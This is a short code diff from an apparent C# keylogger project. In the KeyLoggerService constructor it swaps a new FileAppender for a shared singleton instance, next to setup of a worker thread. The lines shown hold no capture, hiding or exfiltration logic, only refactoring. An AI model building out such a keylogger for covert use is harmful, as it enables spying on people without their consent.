@@ -19,7 +19,7 @@ namespace KeyLogger.Library
 
         public KeyLoggerService()
         {
-            _outputAppender = new FileAppender();
+            _outputAppender = FileAppender.Instance;
             _keyLoggerWorker = new KeyLoggerWorker();
             _workerThread = new Thread(_keyLoggerWorker.DoWork);
         }
